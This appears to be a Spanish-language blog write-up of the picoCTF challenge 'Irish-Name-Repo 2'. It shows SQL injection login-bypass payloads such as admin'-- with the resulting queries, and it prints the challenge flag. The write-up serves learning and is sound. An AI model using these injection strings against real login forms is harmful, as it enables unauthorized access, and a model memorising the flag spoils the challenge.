---
title: Irish-Name-Repo 2
date: 2025-05-23 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, irish name repo 2, sqli]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>Irish-Name-Repo 2
Author: Xingyang Pan
Description
There is a website running at https://jupiter.challenges.picoctf.org/problem/64649/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
{: .prompt-tip }


Ya había visitado esta web antes, en otro reto, de nuevo me fijo en el request en el navegador y vemos el parámetro debug, lo cambio a 1 y vuelvo a introducir admin:admin , pero parece que realmente se han tomado en serio securizar la página y arroja este mensaje cuando pruebo a inyectar en el username o en password "SQLi detected.". 

>debug=1&username=admin&password=a' or 1 = 1

>debug=1&username=admin' or '1=1'--


``` html
username: admin
password: a' or 1 = 1
SQL query: SELECT * FROM users WHERE name='admin' AND password='a' or 1 = 1'

SQLi detected.

username: admin' or '1=1'--
password: 
SQL query: SELECT * FROM users WHERE name='admin' or '1=1'--' AND password=''

SQLi detected.
```

Después de esto te da que pensar que la pista dice que el password se ha filtrado. Empecé a imaginar que sería el apellido o nombre de alguno de los artistas que hay en la web quizás?. Hay una conversación interesante donde aparece un usuario __JimmyMcTrollface__ probablemente el hacker que se ha creado una cuenta . Finalmente pruebo una inyección bastante simple que funciona.

>username: admin'--

``` html
username: admin'--
password: 1234
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='1234'

Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}
```

Si sanitizaron de alguna manera las inyecciones SQLi, lo hicieron mal. 

flag:  **picoCTF{m0R3_SQL_plz_aee925db}**